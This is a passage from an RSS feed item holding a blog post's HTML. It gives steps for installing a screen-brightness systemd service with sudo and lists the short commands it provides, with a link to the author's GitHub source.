</span></span></code></pre></div><ul>
<li>Also as sudo(root), and copy <em>brightness_mod.service</em> to <em>/etc/systemd/system/</em> .</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo cp /path/to/brightness_mod.service /etc/systemd/system/
</span></span></code></pre></div><ul>
<li>Then run:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo systemctl enable brightness_mod.service <span style="color:#f92672">&amp;&amp;</span> sudo systemctl daemon-reload
</span></span></code></pre></div><ul>
<li>I also believe, with how I&rsquo;ve set it up, it needs a reboot.</li>
</ul>
<p>Then the commands are:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>brcur
</span></span><span style="display:flex;"><span>brwn
</span></span><span style="display:flex;"><span>brup
</span></span><span style="display:flex;"><span>brmx
</span></span></code></pre></div><h1 id="heading-1"></h1>
<h1 id="heading-2"></h1>
<p><a href="https://github.com/jb-williams/brightxf">SourceCode</a></p>
<h1 id="heading-3"></h1>
<p><em>written and performed by jb-williams</em> - <a href="https://github.com/jb-williams/">github</a></p>
]]></content>
        </item>
        
    </channel>
</rss>
